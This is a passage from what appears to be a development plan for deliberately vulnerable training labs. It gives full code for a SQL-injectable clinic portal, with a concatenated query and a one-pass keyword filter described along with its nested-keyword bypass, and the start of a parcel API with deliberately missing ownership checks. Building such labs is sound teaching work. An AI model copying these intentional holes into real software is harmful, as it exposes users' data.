  if (r.status !== 0) throw new Error(`docker ${args.slice(0, 2).join(' ')} failed (exit ${r.status})${capture ? `: ${(r.stderr ?? '').trim()}` : ''}`);
  return (r.stdout ?? '').trim();
}

export function main(argv) {
  const only = (() => { const i = argv.indexOf('--lab'); return i >= 0 ? argv[i + 1] : undefined; })();
  const dirs = labDirs().filter((d) => !only || d.name.startsWith(`${only}-`));
  if (dirs.length === 0) throw new Error(only ? `no lab ${only}` : 'no labs under labs/');

  const existing = JSON.parse(readFileSync(REGISTRY, 'utf8'));
  const byId = new Map((existing.labs ?? []).map((l) => [l.id, l]));

  for (const dir of dirs) {
    const manifest = readManifest(dir.path);
    const version = labVersion(dir.path);
    const tag = `sigmajo/hvwa:lab-${manifest.slug}-${version}`;
    docker(['build', '-t', tag, dir.path]);
    const id = docker(['image', 'inspect', '--format', '{{.Id}}', tag], true); // sha256:<64 hex>
    byId.set(manifest.id, { ...manifest, version, image: id });
    console.log(`labs:build ${tag} ${id}`);
  }

  const labs = [...byId.values()].sort((a, b) => a.id.localeCompare(b.id));
  writeFileSync(REGISTRY, `${JSON.stringify({ schema: 1, labs }, null, 2)}\n`, 'utf8');
  console.log(`labs:build wrote ${REGISTRY} (${labs.length} lab(s))`);
  return 0;
}

if (isMainModule(process.argv[1], fileURLToPath(import.meta.url))) {
  try { process.exitCode = main(process.argv.slice(2)); }
  catch (err) { console.error(`labs:build: ${err instanceof Error ? err.message : err}`); process.exitCode = 1; }
}
```

- [ ] **Step 2: Module loads**

Run: `node -e "import('./scripts/lab-build.mjs').then(m=>console.log(typeof m.main))"`
Expected: `function`.

- [ ] **Step 3: Commit**

```bash
git add scripts/lab-build.mjs
git commit -m "feat(labs): labs:build — build lab images and pin them in labs/registry.json (never pushes)"
```

---
## Part 2 — The four labs

Each lab task builds one complete lab package. The per-level flaw lives in one feature; the "test" is black-box: the reference solve scripts drive the running container (`npm run labs:test -- --lab r0N`). Within a task, implement Acolyte first, then its defence (Templar), then the fix (Divine), writing the matching solve as you go. The Vitest gate (`tests/labs-harness.spec.ts`) covers the static layer (manifest, uniqueness, Dockerfile, file layout).

### Task 4: Lab r01 — Mercy Clinic (SQL injection, Easy, Node + SQLite)

**The application.** Mercy Clinic is a small community-clinic patient portal (calm teal/white theme, its own CSS). Pages: `/` (home: clinic blurb, a list of *public* notices, and a notice search box), `/search?q=…` (searches the clinic's notices — **the vulnerable feature**), `/patients` (a seeded staff directory, read-only), `/notices/:id` (view one public notice), `/healthz`. Data is SQLite in a tmpfs file (`/tmp/clinic.db`, because the rootfs is read-only). Two tables: `patients` (seeded directory) and `notices` (clinic bulletins; most are `visibility='public'`, one is `visibility='staff'`). **No endpoint list or tool hint anywhere in the app** — the search box is the only clue; finding that it is injectable is the challenge.

**Flag placement (`db:notices.body`).** At start the app reads `HVWA_FLAG` and inserts a staff-only notice: `('Internal — do not distribute', <flag>, 'staff')`, then deletes `HVWA_FLAG` from `process.env`. The public pages and the public search only ever read `visibility='public'`, so the flag never appears on a normal browse. At Divine, `HVWA_FLAG` is absent; the app plants a decoy staff notice whose body says it is the secure reference.

**The three levels — all the same flaw in the notice search.**

- **Acolyte (no defence).** `/search` builds its SQL by string concatenation: the user's `q` is pasted straight into a `LIKE '%…%'` string literal over `notices` filtered to `visibility='public'`. *Intended path:* close the string literal and append a `UNION SELECT` that returns the staff notice's `body`, which then renders in the results list. *Class of input:* a string that terminates the quoted `LIKE` argument and adds a UNION selecting the hidden column.
- **Templar (a naive filter).** The search strips the keywords `union` and `select` from `q` with a single, case-insensitive pass (`q.replace(/union|select/gi, '')`) and still concatenates the result. The Acolyte UNION payload now arrives with its keywords deleted, so it fails. *Why Acolyte fails here:* the keywords it relies on are removed before the SQL is built. *Intended path:* exploit that the blacklist runs **once**: interleave the keyword with itself so that deleting the inner copy reconstitutes it (a nested-keyword bypass), then run the same UNION. *Class of input:* the Acolyte UNION, with `union`/`select` written so a single removal pass rebuilds them.
- **Divine (the correct fix).** The search uses a parameterised statement — `WHERE visibility = 'public' AND (title LIKE ? OR body LIKE ?)` with the `%q%` value bound — so `q` is data, never SQL, and the `visibility='public'` constant is fixed in the query. The staff notice is unreachable through this endpoint. *Why safe:* no user input ever becomes SQL syntax, and the visibility filter cannot be subverted. No flag exists at Divine; the decoy notice is still staff-only.

**The image.** `node:22.23.5-alpine3.24`, package managers and setuid/setgid bits stripped, non-root `10001:10001`, a `HEALTHCHECK` on `/healthz`, Node standard library only (`node:http`, `node:sqlite`), run with `--experimental-sqlite`.

**Files:**
- Create: `labs/r01-mercy-clinic/{lab.json,Dockerfile,.dockerignore,VERSION,README.md}`
- Create: `labs/r01-mercy-clinic/app/{server.mjs,db.mjs,render.mjs,health.mjs}`
- Create: `labs/r01-mercy-clinic/seed/notices.json`, `labs/r01-mercy-clinic/seed/patients.json`
- Create: `labs/r01-mercy-clinic/solve/{acolyte.mjs,templar.mjs}`

- [ ] **Step 1: `lab.json`, `VERSION`, `.dockerignore`**

`labs/r01-mercy-clinic/lab.json`:

```json
{
  "id": "r01",
  "slug": "mercy-clinic",
  "title": { "en": "Mercy Clinic patient portal", "id": "Portal pasien Mercy Clinic" },
  "app": "Mercy Clinic",
  "category": "SQL injection",
  "difficulty": "easy",
  "levels": ["acolyte", "templar", "divine"],
  "port": 8080,
  "health": "/healthz",
  "flag": { "placement": "db:notices.body" },
  "resources": { "memoryMiB": 128, "pids": 64 },
  "tmpfs": [{ "path": "/tmp", "sizeMiB": 16 }],
  "needsBot": false,
  "themeId": "mercy-clinic",
  "scenario": { "en": "A community clinic portal whose notice search trusts what you type.", "id": "Portal klinik komunitas yang pencarian pengumumannya memercayai masukan Anda." },
  "briefing": { "en": "Mercy Clinic publishes notices for patients. Staff-only notices are kept out of the public lists. Read one you should not be able to read.", "id": "Mercy Clinic menerbitkan pengumuman untuk pasien. Pengumuman khusus staf disembunyikan dari daftar publik. Baca satu yang seharusnya tidak bisa Anda baca." },
  "hints": [
    { "id": 1, "cost": 10, "text": { "en": "Not everything the clinic stores is meant for patients. Where does the portal let you ask it a question?", "id": "Tidak semua yang disimpan klinik ditujukan untuk pasien. Di mana portal membiarkan Anda bertanya?" } },
    { "id": 2, "cost": 20, "text": { "en": "The notice search builds its database query from your text. Public notices are filtered in; staff notices are filtered out.", "id": "Pencarian pengumuman menyusun kuerinya dari teks Anda. Pengumuman publik disaring masuk; pengumuman staf disaring keluar." } },
    { "id": 3, "cost": 30, "text": { "en": "At Templar the filter removes two keywords once. One pass is not enough when a keyword can hide inside itself.", "id": "Di Templar filter menghapus dua kata kunci sekali. Satu lintasan tidak cukup ketika kata kunci bisa bersembunyi di dalam dirinya sendiri." } }
  ]
}
```

`labs/r01-mercy-clinic/VERSION`:

```
1.0.0
```

`labs/r01-mercy-clinic/.dockerignore`:

```
solve
README.md
.dockerignore
VERSION
```

- [ ] **Step 2: `Dockerfile`**

`labs/r01-mercy-clinic/Dockerfile`:

```dockerfile
# labs/r01-mercy-clinic — SQL injection, Easy (Node + SQLite). One image, three levels by HVWA_LEVEL. Runtime contract:
# docs/superpowers/plans/2026-11-20-range-a-platform.md "Interfaces for Plans B–E". Standard library only; node:sqlite
# needs --experimental-sqlite. Read-only rootfs; the DB lives in the /tmp tmpfs.
FROM node:22.23.5-alpine3.24
RUN rm -rf /usr/local/lib/node_modules/npm /usr/local/lib/node_modules/corepack \
    /usr/local/bin/npm /usr/local/bin/npx /usr/local/bin/corepack /usr/local/bin/yarn /usr/local/bin/yarnpkg /opt/yarn-v* \
 && (find / -xdev -type f -perm /6000 -exec chmod a-s {} + 2>/dev/null || true)
WORKDIR /app
COPY app/ ./
COPY seed/ ./seed/
COPY lab.json ./lab.json
USER 10001:10001
EXPOSE 8080
HEALTHCHECK --interval=2s --timeout=2s --start-period=30s --start-interval=500ms --retries=3 CMD ["node", "/app/health.mjs"]
CMD ["node", "--experimental-sqlite", "/app/server.mjs"]
```

- [ ] **Step 3: `app/health.mjs`**

`labs/r01-mercy-clinic/app/health.mjs`:

```js
// The image's HEALTHCHECK: exit 0 when the app answers lab.json's health path (/healthz), else 1.
const port = Number(process.env.HVWA_PORT || 8080);
fetch(`http://127.0.0.1:${port}/healthz`, { signal: AbortSignal.timeout(1500) })
  .then((r) => process.exit(r.ok ? 0 : 1), () => process.exit(1));
```

- [ ] **Step 4: `seed/*.json`**

`labs/r01-mercy-clinic/seed/notices.json` (public notices only; the staff notice is planted at start):

```json
[
  { "title": "Flu clinic every Tuesday", "body": "Walk-in flu shots are available every Tuesday from 9am to noon. No appointment needed." },
  { "title": "New online repeat prescriptions", "body": "You can now request repeat prescriptions from your portal account. Allow two working days." },
  { "title": "Car park resurfacing", "body": "The west car park is closed for resurfacing until the end of the month. Please use the street entrance." },
  { "title": "Measles vaccination reminder", "body": "Children aged 1 to 5 are due their second MMR dose. Call reception to book." }
]
```

`labs/r01-mercy-clinic/seed/patients.json` (a believable directory; no secrets):

```json
[
  { "name": "Dr. Alina Okonkwo", "role": "General practitioner", "room": "1A" },
  { "name": "Dr. Ravi Menon", "role": "General practitioner", "room": "1B" },
  { "name": "Sister Grace Abbott", "role": "Practice nurse", "room": "2A" },
  { "name": "Tomas Lindqvist", "role": "Reception lead", "room": "Front desk" }
]
```

- [ ] **Step 5: `app/db.mjs` — schema, seed, flag planting, and the per-level search**

`labs/r01-mercy-clinic/app/db.mjs`:

```js
// labs/r01-mercy-clinic/app/db.mjs — the clinic's SQLite store (node:sqlite, --experimental-sqlite). The DB lives in the
// /tmp tmpfs because the rootfs is read-only. The notice search is the vulnerable feature; its three implementations are
// chosen by HVWA_LEVEL. The flag is a staff-only notice planted by the start hook (never on a public page).
import { DatabaseSync } from 'node:sqlite';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const here = dirname(fileURLToPath(import.meta.url));
const seed = (name) => JSON.parse(readFileSync(join(here, 'seed', name), 'utf8'));

export function openDb(path = '/tmp/clinic.db') {
  const db = new DatabaseSync(path);
  db.exec(`
    CREATE TABLE patients (id INTEGER PRIMARY KEY, name TEXT, role TEXT, room TEXT);
    CREATE TABLE notices  (id INTEGER PRIMARY KEY, title TEXT, body TEXT, visibility TEXT NOT NULL DEFAULT 'public');
  `);
  const ins = db.prepare('INSERT INTO patients (name, role, room) VALUES (?, ?, ?)');
  for (const p of seed('patients.json')) ins.run(p.name, p.role, p.room);
  const insN = db.prepare('INSERT INTO notices (title, body, visibility) VALUES (?, ?, ?)');
  for (const n of seed('notices.json')) insN.run(n.title, n.body, 'public');
  return db;
}

/** The start hook: plant the flag (or a Divine decoy) as a staff-only notice, invisible to the public pages. */
export function plantFlag(db, level, flag) {
  const body = level === 'divine' || !flag
    ? 'Divine is the secure reference: the search is parameterised, so there is no flag to recover here.'
    : flag;
  db.prepare('INSERT INTO notices (title, body, visibility) VALUES (?, ?, ?)')
    .run('Internal — do not distribute', body, 'staff');
}

/** Public notices for the home page and /notices/:id (always visibility='public'; parameterised everywhere). */
export const listPublic = (db) => db.prepare("SELECT id, title, body FROM notices WHERE visibility = 'public' ORDER BY id").all();
export const getPublic = (db, id) => db.prepare("SELECT id, title, body FROM notices WHERE visibility = 'public' AND id = ?").get(id);
export const listPatients = (db) => db.prepare('SELECT name, role, room FROM patients ORDER BY id').all();

/**
 * The notice search, per level. Returns rows [{ id, title, body }].
 * - acolyte: q concatenated straight into a LIKE string literal (classic SQLi).
 * - templar: the keywords union/select are stripped ONCE, then the same concatenation (a single-pass blacklist).
 * - divine:  a parameterised statement; q is bound data and the visibility filter is fixed.
 */
export function searchNotices(db, level, q) {
  if (level === 'divine') {
    const like = `%${q}%`;
    return db.prepare("SELECT id, title, body FROM notices WHERE visibility = 'public' AND (title LIKE ? OR body LIKE ?) ORDER BY id").all(like, like);
  }
  const term = level === 'templar' ? q.replace(/union|select/gi, '') : q;
  const sql = "SELECT id, title, body FROM notices WHERE visibility = 'public' AND (title LIKE '%" + term + "%' OR body LIKE '%" + term + "%') ORDER BY id";
  try {
    return db.prepare(sql).all();
  } catch {
    return []; // a malformed injection just yields no rows, like a real app swallowing a query error
  }
}
```

- [ ] **Step 6: `app/render.mjs` — the clinic theme and HTML helpers**

`labs/r01-mercy-clinic/app/render.mjs`:

```js
// labs/r01-mercy-clinic/app/render.mjs — the Mercy Clinic look (its own small CSS) and HTML helpers. No HVWA chrome,
// no endpoint list, no tool hints. User-supplied text is HTML-escaped; the SQL flaw is in db.mjs, not in the markup.
export const esc = (s) => String(s).replace(/[&<>"']/g, (c) => `&#${c.charCodeAt(0)};`);

const CSS = `
:root{--teal:#0e7c7b;--ink:#163a3a;--paper:#f3f8f8;--line:#cfe3e3}
*{box-sizing:border-box}body{margin:0;font:16px/1.5 "Segoe UI",system-ui,sans-serif;color:var(--ink);background:var(--paper)}
header{background:var(--teal);color:#fff;padding:18px 24px}header h1{margin:0;font-size:20px;letter-spacing:.3px}
header p{margin:2px 0 0;opacity:.85;font-size:13px}
main{max-width:760px;margin:24px auto;padding:0 16px}
nav a{color:var(--teal);text-decoration:none;margin-right:16px;font-weight:600}
form.search{display:flex;gap:8px;margin:18px 0}
form.search input{flex:1;padding:10px;border:1px solid var(--line);border-radius:8px}
form.search button{padding:10px 16px;border:0;border-radius:8px;background:var(--teal);color:#fff;font-weight:600;cursor:pointer}
.card{background:#fff;border:1px solid var(--line);border-radius:10px;padding:14px 16px;margin:12px 0}
.card h3{margin:0 0 6px;font-size:16px}table{width:100%;border-collapse:collapse}
td,th{border-bottom:1px solid var(--line);padding:8px;text-align:left}
footer{color:#6c8b8b;font-size:12px;text-align:center;margin:40px 0 20px}
`;

export function page(title, bodyHtml) {
  return `<!doctype html><html lang="en"><head><meta charset="utf-8">`
    + `<meta name="viewport" content="width=device-width, initial-scale=1">`
    + `<title>${esc(title)} — Mercy Clinic</title><style>${CSS}</style></head><body>`
    + `<header><h1>Mercy Clinic</h1><p>Caring for our community since 1996</p></header>`
    + `<main><nav><a href="/">Home</a><a href="/patients">Our team</a></nav>${bodyHtml}`
    + `<footer>Mercy Clinic • Registered charity • This portal is for patient use</footer></main></body></html>`;
}

export const noticeCard = (n) => `<div class="card"><h3>${esc(n.title)}</h3><p>${esc(n.body)}</p></div>`;
```

- [ ] **Step 7: `app/server.mjs` — the start hook, routing, and level selection**

`labs/r01-mercy-clinic/app/server.mjs`:

```js
// labs/r01-mercy-clinic/app/server.mjs — Mercy Clinic. Start hook: open the SQLite DB in /tmp, seed it, plant the flag
// as a staff-only notice, then DELETE HVWA_FLAG from the environment before serving (spec §6). The notice search at
// /search is the vulnerable feature; its behaviour is chosen by HVWA_LEVEL (db.mjs). Listens on 0.0.0.0:$HVWA_PORT.
import { createServer } from 'node:http';
import { openDb, plantFlag, listPublic, getPublic, listPatients, searchNotices } from './db.mjs';
import { page, noticeCard, esc } from './render.mjs';

const LEVELS = ['acolyte', 'templar', 'divine'];
const level = LEVELS.includes(process.env.HVWA_LEVEL ?? '') ? process.env.HVWA_LEVEL : 'acolyte';
const port = Number(process.env.HVWA_PORT || 8080);

const flag = process.env.HVWA_FLAG;
delete process.env.HVWA_FLAG;                 // the process must not keep the flag in its environment
const db = openDb('/tmp/clinic.db');
plantFlag(db, level, flag);

const send = (res, status, type, body) => { res.writeHead(status, { 'content-type': type, 'cache-control': 'no-store' }); res.end(body); };
const html = (res, status, body) => send(res, status, 'text/html; charset=utf-8', body);

createServer((req, res) => {
  const url = new URL(req.url ?? '/', 'http://clinic');
  const p = url.pathname;

  if (p === '/healthz') return send(res, 200, 'application/json', '{"status":"ok"}');

  if (p === '/') {
    const notices = listPublic(db).map(noticeCard).join('');
    return html(res, 200, page('Home',
      `<h2>Patient notices</h2>`
      + `<form class="search" action="/search" method="get"><input name="q" placeholder="Search notices"><button>Search</button></form>`
      + notices));
  }

  if (p === '/search') {
    const q = url.searchParams.get('q') ?? '';
    const rows = q.trim() === '' ? [] : searchNotices(db, level, q);
    const results = rows.length ? rows.map(noticeCard).join('') : `<p class="card">No notices matched “${esc(q)}”.</p>`;
    return html(res, 200, page('Search',
      `<form class="search" action="/search" method="get"><input name="q" value="${esc(q)}"><button>Search</button></form>`
      + `<h2>Results</h2>${results}`));
  }

  if (p === '/patients') {
    const rows = listPatients(db).map((r) => `<tr><td>${esc(r.name)}</td><td>${esc(r.role)}</td><td>${esc(r.room)}</td></tr>`).join('');
    return html(res, 200, page('Our team', `<h2>Our team</h2><table><tr><th>Name</th><th>Role</th><th>Room</th></tr>${rows}</table>`));
  }

  const mNotice = p.match(/^\/notices\/(\d+)$/);
  if (mNotice) {
    const n = getPublic(db, Number(mNotice[1]));
    if (!n) return html(res, 404, page('Not found', `<p class="card">That notice is not available.</p>`));
    return html(res, 200, page(n.title, noticeCard(n)));
  }

  return html(res, 404, page('Not found', `<p class="card">Page not found.</p>`));
}).listen(port, '0.0.0.0', () => console.log(`mercy-clinic on :${port} (${level})`));
```

- [ ] **Step 8: The reference solves (`solve/acolyte.mjs`, `solve/templar.mjs`)**

Both solves are ordinary HTTP clients: they GET `/search?q=<input>` and read the staff notice's body out of the returned HTML. The one value left to the implementer is the injection string; the prose above says exactly what it must achieve, and `npm run labs:test -- --lab r01` proves it.

`labs/r01-mercy-clinic/solve/acolyte.mjs`:

```js
// Reference solve — Mercy Clinic, Acolyte. The notice search concatenates q into a LIKE string literal over the PUBLIC
// notices. INJECTION must close that string literal and UNION-select the staff notice's body so it renders in the
// results. (The results render three columns: id, title, body — line the UNION up with those.) The implementer writes
// the exact string; labs:test proves this prints the flag. No payload is hard-coded in the plan by design.
const base = process.argv[2];
const INJECTION = '';   // <- implementer supplies this per the prose; see README.md and the plan's level design.
const res = await fetch(`${base}/search?q=${encodeURIComponent(INJECTION)}`);
const html = await res.text();
const m = html.match(/HVWA\{[a-z2-7]{26}\}/);
if (m) console.log(m[0]);
```

`labs/r01-mercy-clinic/solve/templar.mjs`:

```js
// Reference solve — Mercy Clinic, Templar. Same UNION idea as Acolyte, but the search strips `union` and `select` once
// (case-insensitive) before concatenating. INJECTION must survive that single removal pass — write the two keywords so
// that deleting the inner occurrence rebuilds them — then recover the staff notice's body as before. Implementer-supplied.
const base = process.argv[2];
const INJECTION = '';   // <- implementer supplies this per the prose (nested-keyword bypass of a single-pass blacklist).
const res = await fetch(`${base}/search?q=${encodeURIComponent(INJECTION)}`);
const html = await res.text();
const m = html.match(/HVWA\{[a-z2-7]{26}\}/);
if (m) console.log(m[0]);
```

- [ ] **Step 9: `README.md` — author notes**

`labs/r01-mercy-clinic/README.md`:

```markdown
# Mercy Clinic (r01) — SQL injection (Easy)

Mercy Clinic is a community-clinic patient portal. Patients read notices and search them; staff-only notices are kept
out of every public list. The flag is the body of a staff-only notice, planted at start from `HVWA_FLAG` and then
scrubbed from the environment. The database lives in the `/tmp` tmpfs (the rootfs is read-only).

## Vulnerable feature
`GET /search?q=` — the notice search. All other queries in `db.mjs` are parameterised; only the search changes per level.

## Levels
- **Acolyte.** `q` is concatenated into a `LIKE '%…%'` string literal over `visibility='public'` notices. Intended
  path: close the literal and `UNION SELECT` the staff notice's `body` (three result columns: id, title, body). 
- **Templar.** The search removes the keywords `union` and `select` once (`replace(/union|select/gi,'')`) and then
  concatenates. The Acolyte payload loses its keywords and fails. Intended path: nest each keyword inside itself so a
  single removal pass rebuilds it, then run the same UNION. This is why Acolyte does not carry up: its keywords are
  deleted before the SQL is built.
- **Divine.** The search is a prepared statement with the `%q%` value bound and `visibility='public'` fixed in SQL.
  `q` can never become SQL syntax and the staff notice is unreachable. No flag exists; a decoy staff notice explains it.

## Reference solves
`solve/acolyte.mjs` and `solve/templar.mjs` are HTTP clients that read the flag out of the search results. The exact
injection string is left to the implementer; `npm run labs:test -- --lab r01` is the proof it works and that the
Acolyte string fails at Templar and Divine, and the Templar string fails at Divine.
```

- [ ] **Step 10: Static gate**

Run: `npx vitest run tests/labs-harness.spec.ts`
Expected: the r01 cases pass (manifest valid, files present, Dockerfile pinned, uniqueness holds). Other labs' layout cases stay red until their tasks land — acceptable mid-Part-2; the suite is green after Task 7.

- [ ] **Step 11: Black-box gate (needs Docker; implementer fills the two injections first)**

Run: `npm run labs:test -- --lab r01`
Expected (once the injections are written): `PASS r01` lines for health (×3), both solves obtaining their flag, each lower solve failing at higher levels, Divine resisting, no flag on browse, and no egress; final `labs:test OK`.

- [ ] **Step 12: Commit**

```bash
git add labs/r01-mercy-clinic
git commit -m "feat(labs): r01 Mercy Clinic — SQL injection lab (3 levels)"
```

---
### Task 5: Lab r02 — Courier (broken access control in a REST API, Easy, Node)

**The application.** Courier is a parcel-tracking customer portal with a small JSON REST API (orange/navy logistics theme, its own CSS). Pages/resources: `/` (landing with a "View demo dashboard" button), `/dashboard` (the demo customer's own parcels, each with a "Print label" link), and the API `POST /api/session` (open a demo session → bearer token), `GET /api/parcels` (my parcels), `GET /api/parcels/:id` (one parcel's detail), `GET /api/parcels/:id/label` (a shipping label, which includes the parcel's private delivery `note`). Data is in memory. Two seeded customers: `demo` (owns parcels 2001, 2002) and `vault` (owns 1001, 1002). **No endpoint list in the app** — the dashboard's own "Print label" links reveal the label route for *your* parcels; applying parcel access to *someone else's* id is the challenge.

**Flag placement (`custom`).** At start the app reads `HVWA_FLAG` and sets it as the private `note` on parcel 1001 (owned by `vault`, never the demo customer), then deletes `HVWA_FLAG` from `process.env`. Nothing the demo customer legitimately sees contains it. At Divine, `HVWA_FLAG` is absent and parcel 1001's note is a decoy explaining the secure reference.

**The three levels — all the same flaw: parcel resources are authenticated but not authorized.**

- **Acolyte (no defence).** Every parcel route returns the parcel for any logged-in customer; ownership is never checked. *Intended path:* open a demo session, then read another customer's parcel by its id (ids are small integers; your own are 2001/2002, so 1xxx exist). *Class of input:* a parcel id you do not own.
- **Templar (a partial check).** `GET /api/parcels/:id` now verifies that the parcel's owner is the session's customer (403 otherwise) — but the sibling `GET /api/parcels/:id/label` was not updated and still returns any parcel's label (with its `note`). *Why Acolyte fails here:* the detail route it used now returns 403 for parcels you don't own. *Intended path:* use the overlooked label route (discoverable from your own dashboard's "Print label" links) against the other customer's id. *Class of input:* the same foreign id, via the route that was missed.
- **Divine (the correct fix).** A single `requireOwner(session, parcel)` guard runs on **every** parcel route — detail, label and events — comparing the parcel's owner to the authenticated session server-side. Foreign ids get 403 everywhere. *Why safe:* authorization is enforced on every resource, not just the obvious one, and never trusts a client-supplied identity. No flag at Divine.

**The image.** `node:22.23.5-alpine3.24`, package managers and setuid/setgid stripped, non-root `10001:10001`, `HEALTHCHECK` on `/healthz`, Node standard library only (`node:http`), no SQLite.

**Files:**
- Create: `labs/r02-courier/{lab.json,Dockerfile,.dockerignore,VERSION,README.md}`
- Create: `labs/r02-courier/app/{server.mjs,store.mjs,render.mjs,health.mjs}`
- Create: `labs/r02-courier/seed/parcels.json`
- Create: `labs/r02-courier/solve/{acolyte.mjs,templar.mjs}`

- [ ] **Step 1: `lab.json`, `VERSION`, `.dockerignore`**

`labs/r02-courier/lab.json`:

```json
{
  "id": "r02",
  "slug": "courier",
  "title": { "en": "Courier parcel tracking", "id": "Pelacakan paket Courier" },
  "app": "Courier",
  "category": "Broken access control",
  "difficulty": "easy",
  "levels": ["acolyte", "templar", "divine"],
  "port": 8080,
  "health": "/healthz",
  "flag": { "placement": "custom" },
  "resources": { "memoryMiB": 96, "pids": 48 },
  "tmpfs": [{ "path": "/tmp", "sizeMiB": 8 }],
  "needsBot": false,
  "themeId": "courier",
  "scenario": { "en": "A parcel-tracking API that checks who you are but not what is yours.", "id": "API pelacakan paket yang memeriksa siapa Anda tetapi bukan apa milik Anda." },
  "briefing": { "en": "Courier lets each customer track their own parcels. One parcel is not yours. Read its private delivery note.", "id": "Courier membiarkan tiap pelanggan melacak paket mereka sendiri. Satu paket bukan milik Anda. Baca catatan pengiriman pribadinya." },
  "hints": [
    { "id": 1, "cost": 10, "text": { "en": "Open the demo dashboard and watch what requests it makes for your parcels.", "id": "Buka dasbor demo dan amati permintaan apa yang dibuatnya untuk paket Anda." } },
    { "id": 2, "cost": 20, "text": { "en": "Parcel numbers are predictable. Yours begin with 2. What begins with 1?", "id": "Nomor paket dapat ditebak. Milik Anda dimulai dengan 2. Apa yang dimulai dengan 1?" } },
    { "id": 3, "cost": 30, "text": { "en": "At Templar the detail view guards ownership. The label does the same job — does it guard it too?", "id": "Di Templar tampilan detail menjaga kepemilikan. Label melakukan tugas yang sama — apakah ia juga menjaganya?" } }
  ]
}
```

`labs/r02-courier/VERSION`: `1.0.0`

`labs/r02-courier/.dockerignore`:

```
solve
README.md
.dockerignore
VERSION
```

- [ ] **Step 2: `Dockerfile`**

`labs/r02-courier/Dockerfile`:

```dockerfile
# labs/r02-courier — Broken access control (API), Easy (Node, in-memory). One image, three levels by HVWA_LEVEL.
# Runtime contract: plan 2026-11-20-range-a-platform.md "Interfaces for Plans B–E". Standard library only; read-only rootfs.
FROM node:22.23.5-alpine3.24
RUN rm -rf /usr/local/lib/node_modules/npm /usr/local/lib/node_modules/corepack \
    /usr/local/bin/npm /usr/local/bin/npx /usr/local/bin/corepack /usr/local/bin/yarn /usr/local/bin/yarnpkg /opt/yarn-v* \
 && (find / -xdev -type f -perm /6000 -exec chmod a-s {} + 2>/dev/null || true)
WORKDIR /app
COPY app/ ./
COPY seed/ ./seed/
COPY lab.json ./lab.json
USER 10001:10001
EXPOSE 8080
HEALTHCHECK --interval=2s --timeout=2s --start-period=30s --start-interval=500ms --retries=3 CMD ["node", "/app/health.mjs"]
CMD ["node", "/app/server.mjs"]
```

- [ ] **Step 3: `app/health.mjs`** (identical probe pattern to r01)

```js
const port = Number(process.env.HVWA_PORT || 8080);
fetch(`http://127.0.0.1:${port}/healthz`, { signal: AbortSignal.timeout(1500) })
  .then((r) => process.exit(r.ok ? 0 : 1), () => process.exit(1));
```

- [ ] **Step 4: `seed/parcels.json`**

```json
[
  { "id": 2001, "owner": "demo", "to": "A. Demo, 14 Harbour Row", "status": "Out for delivery", "note": "Leave with the concierge." },
  { "id": 2002, "owner": "demo", "to": "A. Demo, 14 Harbour Row", "status": "Delivered", "note": "Signed for by A. Demo." },
  { "id": 1001, "owner": "vault", "to": "Vault Logistics, Bay 7", "status": "Held at depot", "note": "Awaiting customs release (overwritten at start by the flag, or by the Divine decoy)." },
  { "id": 1002, "owner": "vault", "to": "Vault Logistics, Bay 7", "status": "In transit", "note": "Fragile: ceramics." }
]
```

- [ ] **Step 5: `app/store.mjs` — in-memory data, sessions, flag planting, and the per-level ownership rule**

`labs/r02-courier/app/store.mjs`:

```js
// labs/r02-courier/app/store.mjs — Courier's in-memory data and sessions. The flaw is authorization, not authentication:
// a session is easy to get (demo mode); the question is which parcels it may read. The per-level rule is `canRead`.
import { readFileSync } from 'node:fs';
import { randomBytes } from 'node:crypto';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const here = dirname(fileURLToPath(import.meta.url));

export function createStore(level, flag) {
  const parcels = JSON.parse(readFileSync(join(here, 'seed', 'parcels.json'), 'utf8'));
  const vaultParcel = parcels.find((p) => p.id === 1001);
  vaultParcel.note = level === 'divine' || !flag
    ? 'Divine is the secure reference: every parcel route checks ownership, so there is no note to steal here.'
    : flag;
  const sessions = new Map(); // token -> customerId

  return {
    openDemoSession() { const token = randomBytes(18).toString('base64url'); sessions.set(token, 'demo'); return token; },
    customerFor(token) { return token ? sessions.get(token) : undefined; },
    parcel(id) { return parcels.find((p) => p.id === id); },
    parcelsOf(customer) { return parcels.filter((p) => p.owner === customer); },

    /**
     * May `customer` read `parcel` through route `kind` ('detail' | 'label' | 'events')?
     * - acolyte: always (no authorization at all).
     * - templar: 'detail' requires ownership; 'label' and 'events' were NOT updated (the partial fix).
     * - divine:  every route requires ownership.
     */
    canRead(customer, parcel, kind) {
      if (level === 'acolyte') return true;
      if (level === 'templar') return kind === 'detail' ? parcel.owner === customer : true;
      return parcel.owner === customer; // divine
    },
  };
}
```

- [ ] **Step 6: `app/render.mjs` — the Courier theme and HTML helpers**

`labs/r02-courier/app/render.mjs`:

```js
// labs/r02-courier/app/render.mjs — the Courier look (its own small CSS) and HTML helpers. No endpoint list, no hints.
export const esc = (s) => String(s).replace(/[&<>"']/g, (c) => `&#${c.charCodeAt(0)};`);

const CSS = `
:root{--orange:#e8602c;--navy:#1f2a44;--paper:#fbf7f3;--line:#e5d8cc}
*{box-sizing:border-box}body{margin:0;font:16px/1.5 "Segoe UI",system-ui,sans-serif;color:var(--navy);background:var(--paper)}
header{background:var(--navy);color:#fff;padding:16px 24px;display:flex;align-items:center;gap:12px}
header .dot{width:14px;height:14px;border-radius:50%;background:var(--orange)}header h1{margin:0;font-size:20px}
main{max-width:720px;margin:28px auto;padding:0 16px}
.btn{display:inline-block;background:var(--orange);color:#fff;border:0;border-radius:8px;padding:10px 18px;font-weight:700;text-decoration:none;cursor:pointer}
.parcel{background:#fff;border:1px solid var(--line);border-radius:10px;padding:14px 16px;margin:12px 0}
.parcel h3{margin:0 0 4px}.parcel .status{color:var(--orange);font-weight:600}
.parcel a{color:var(--navy);font-weight:600}
footer{color:#9a8b7d;font-size:12px;text-align:center;margin:40px 0 20px}
`;

export function page(title, bodyHtml) {
  return `<!doctype html><html lang="en"><head><meta charset="utf-8">`
    + `<meta name="viewport" content="width=device-width, initial-scale=1">`
    + `<title>${esc(title)} — Courier</title><style>${CSS}</style></head><body>`
    + `<header><span class="dot"></span><h1>Courier</h1></header><main>${bodyHtml}`
    + `<footer>Courier • Track every step • Customer portal</footer></main></body></html>`;
}
```

- [ ] **Step 7: `app/server.mjs` — start hook, HTML pages, and the JSON API**

`labs/r02-courier/app/server.mjs`:

```js
